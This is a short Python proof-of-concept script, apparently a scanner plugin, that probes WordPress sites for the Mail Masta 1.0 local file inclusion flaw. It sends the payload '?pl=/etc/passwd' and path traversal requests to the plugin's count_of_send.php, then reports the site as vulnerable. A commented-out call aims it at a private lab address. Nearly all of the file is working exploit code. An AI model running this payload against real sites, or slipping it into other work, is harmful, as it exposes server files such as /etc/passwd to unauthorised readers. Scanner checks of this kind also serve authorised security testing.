# coding: utf-8
import requests
import random

def vuln_check(uri):
    response = requests.get(uri)
    if len(response.content) < 1000 :
        return False
    else:
        return True

#WordPress Plugin Mail Masta 1.0 - Local File Inclusion
def poc(url,user_agent,proxy):

    url = url.strip("/")
    valid = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
    check = vuln_check(url+valid)
    if not check:
        return

    endpoint = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl="
    exp_url1=url+endpoint+'../../readme.txt'
    exp_url2 = url + endpoint + '../../readme1.txt'
    # exp_url=url+endpoint+'count_of_send.php'
    header = {
        'User-Agent': user_agent
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = requests.post(exp_url1, headers=header, proxies=proxies)
        response2 = requests.post(exp_url2, headers=header, proxies=proxies)
    else:
        response1 = requests.post(exp_url1, headers=header)
        response2 = requests.post(exp_url2, headers=header)

    if  len(response1.content)>500 and 'Mail Masta ' in response1.text or 'Warning' in response2.text and 'include(): Failed opening' in response2.text:

        return 'WordPress Plugin Mail Masta 1.0 - 文件包含漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','127.0.0.1:8080')
